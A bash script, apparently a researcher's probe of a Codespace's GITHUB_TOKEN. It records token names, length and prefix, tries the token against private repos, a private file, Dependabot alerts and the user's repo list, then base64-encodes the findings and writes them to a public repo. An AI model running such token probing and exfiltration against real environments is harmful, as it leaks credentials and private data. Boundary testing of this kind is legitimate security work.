#!/usr/bin/env bash
OUT=/tmp/cs_result.txt
: > $OUT
T="${GITHUB_TOKEN:-}"
echo "TOKEN_VARS=$(env | grep -oE '^[A-Z_]*TOKEN' | sort -u | tr '\n' ',')" >> $OUT
echo "GITHUB_TOKEN_SET=$([ -n "$T" ] && echo yes || echo no) len=${#T}" >> $OUT
echo "TOKEN_PREFIX=$(printf '%s' "$T" | cut -c1-4)" >> $OUT
q(){ printf '%s=%s\n' "$1" "$(curl -s -o /tmp/b -w '%{http_code}' -H "Authorization: Bearer $T" "$2"; echo -n ' canary='; grep -c 'CANARY_A_1122' /tmp/b 2>/dev/null | head -1)" >> $OUT; }
# CONTROL: its own repo
q CONTROL_own_repo        "https://api.github.com/repos/antonade/gh-probe-pub"
q CONTROL_own_contents    "https://api.github.com/repos/antonade/gh-probe-pub/contents/README.md"
# THE BOUNDARY: the PRIVATE repo
q PRIV_repo_meta          "https://api.github.com/repos/antonade/gh-probe-a"
q PRIV_privfile           "https://api.github.com/repos/antonade/gh-probe-a/contents/PRIVFILE.txt"
q PRIV_dependabot_alerts  "https://api.github.com/repos/antonade/gh-probe-a/dependabot/alerts"
q PRIV_other_private      "https://api.github.com/repos/antonade/gh-probe-priv"
q USER_repos_private      "https://api.github.com/user/repos?visibility=private&per_page=100"
q USER_whoami             "https://api.github.com/user"
# report back by writing a file to the PUBLIC repo with the same token
B64=$(base64 -w0 $OUT)
code=$(curl -s -o /tmp/w -w '%{http_code}' -X PUT -H "Authorization: Bearer $T" \
  "https://api.github.com/repos/antonade/gh-probe-pub/contents/cs-result.txt" \
  -d "{\"message\":\"codespace probe result\",\"branch\":\"csresult\",\"content\":\"$B64\"}")
echo "SELFREPORT_HTTP=$code" >> $OUT
curl -s -X PUT -H "Authorization: Bearer $T" \
  "https://api.github.com/repos/antonade/gh-probe-pub/contents/cs-result.txt" \
  -d "{\"message\":\"codespace probe result\",\"branch\":\"csresult\",\"content\":\"$(base64 -w0 $OUT)\"}" >/dev/null
